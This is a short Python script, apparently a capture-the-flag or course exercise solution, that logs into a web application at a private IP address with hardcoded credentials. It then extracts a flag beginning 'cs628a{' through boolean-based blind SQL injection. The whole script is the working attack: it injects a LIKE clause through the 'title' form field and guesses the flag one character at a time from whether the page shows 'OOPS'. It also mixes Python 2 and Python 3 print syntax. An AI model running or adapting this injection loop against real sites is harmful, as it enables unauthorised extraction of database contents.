import requests
import string

r = requests.Session()
login_data = {'username':'v4090', 'password':'c5e3ae77'}

r_login = r.post("https://172.27.36.9:4431/login.php", login_data, verify=False)
print(r_login.content)

charset = string.ascii_letters + string.digits + "}"
str = ""
while True:
    for char in charset:
        str_try = str + char
        request = {'title': "a' OR director LIKE 'cs628a{" + str_try + "%", 'action' : 'submit'}
        e = r.post("https://172.27.36.9:4431/index.php", request, verify=False)
        if "OOPS" not in e.text:
            str += char
            print str

